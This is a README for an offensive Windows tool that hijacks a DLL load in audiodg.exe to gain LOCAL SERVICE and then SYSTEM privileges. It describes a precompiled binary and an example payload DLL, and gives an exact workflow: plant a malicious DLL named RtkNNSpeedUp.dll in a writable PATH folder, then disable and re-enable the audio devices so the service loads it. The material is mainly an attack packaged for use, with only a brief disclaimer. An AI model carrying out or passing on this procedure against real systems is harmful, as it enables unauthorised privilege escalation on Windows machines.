# AudioDG.exe DLL Hijacking for LPE

Exploits DLL hijacking in `audiodg.exe` to execute code as `NT AUTHORITY\LOCAL SERVICE` with escalation path to `NT AUTHORITY\SYSTEM`.

Includes a reboot-free restart primitive using the undocumented `IPolicyConfig` COM interface.

## Blog Post

For a detailed technical writeup and how to escalate to NT AUTHORITY\SYSTEM see:

[Abusing Windows Audio for Local Privilege Escalation](https://medium.com/@S.1.l.k.y/abusing-windows-audio-for-local-privilege-escalation-1d59440116cb)

## Contents

| File | Description |
|------|-------------|
| `audio_disable_debug.cpp` | Audio Device Controller source code |
| `audio_disable_debug_x64.exe` | Precompiled x64 binary |
| `Hijack.cpp` | Example DLL payload for privilege escalation |
| `windows_audio_device_control.pdf` | Additional technical documentation |

## Audio Device Controller

### Usage

```
audio_disable_debug_x64.exe [command]
```

### Commands

| Command | Description |
|---------|-------------|
| `list` | List all audio render devices |
| `disable` | Disable active devices and save state |
| `enable` | Enable previously disabled devices from state |
| `status` | Show current state and saved state info |
| `-h` | Show help |



```
PS C:\Users\mbzra\Dropbox\PC\Downloads> .\audio_disable_debug_x64.exe -h
========================================
Audio Device Controller - Debug Version
========================================

[DEBUG] Gathering system information...
[DEBUG] Windows Version: 10.0 (Build 26100)
[DEBUG] Process ID: 5612
[DEBUG] Thread ID: 25068

[DEBUG] Command: -h
Usage: C:\Users\mbzra\Dropbox\PC\Downloads\audio_disable_debug_x64.exe [command]

Commands:
  list      - List all audio render devices
  disable   - Disable active devices and save state
  enable    - Enable previously disabled devices from state
  status    - Show current state and saved state info

If no command is given, 'disable' is assumed.

State file: %%TEMP%%\audio_devices_state.txt
PS C:\Users\mbzra\Dropbox\PC\Downloads>
```

### Example Workflow

```bash
# 1. Place malicious DLL in writable System PATH
copy payload.dll C:\WritablePath\RtkNNSpeedUp.dll

# 2. Disable all audio endpoints (triggers audiodg.exe termination after ~2-5 min)
audio_disable_debug_x64.exe disable

# 3. Re-enable audio endpoints (audiodg.exe restarts and loads DLL)
audio_disable_debug_x64.exe enable
```

## Tested On

- Windows 11 Home
- Windows 11 Professional

## Disclaimer

For authorized security testing only.
